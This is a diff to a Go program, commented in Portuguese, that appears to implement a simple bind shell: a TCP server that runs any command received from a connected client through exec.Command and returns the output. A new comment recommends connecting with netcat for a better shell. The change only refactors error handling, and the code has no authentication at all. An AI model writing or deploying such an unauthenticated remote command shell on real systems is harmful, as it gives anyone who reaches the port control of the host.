@@ -9,6 +9,8 @@ import (
 	"strings"
 )
 
+// ao usar um netcat para estabelcer a conexao com esse shell, tera uma shel
+// com menos erros e boogs
 //Servidor que delvolve um Shell para cliente
 func err(erro error) {
 	if erro != nil {
@@ -41,7 +43,11 @@ func tcpBasico() {
 		//retorna mensagen ou um comando para o cliente conectado
 		//Eviando ( mensagem e receberConexao ) como argumento para a func executeCmd
 
-		comando := executeCmd(mensagem, receberConexao)
+		//comando := executeCmd(mensagem, receberConexao)
+		comando, errCmd := executeCmd(mensagem)
+		if errCmd != nil {
+			fmt.Fprintf(receberConexao, "%s\n", errCmd)
+		}
 		receberConexao.Write([]byte(comando))
 	}
 
@@ -58,14 +64,10 @@ func tcpBasico() {
 	}
 
 */
-func executeCmd(comando string, conn net.Conn) []byte {
+func executeCmd(comando string) ([]byte, error) {
 
 	retornaComandoParaCliete, errCmd := exec.Command(strings.TrimSuffix(comando, "\n")).Output()
-	if errCmd != nil {
-		//informa ao usuario que algo saiu erado
-		fmt.Fprintf(conn, "%s\n", errCmd)
-	}
-	return retornaComandoParaCliete
+	return retornaComandoParaCliete, errCmd
 }
 
 //func principal
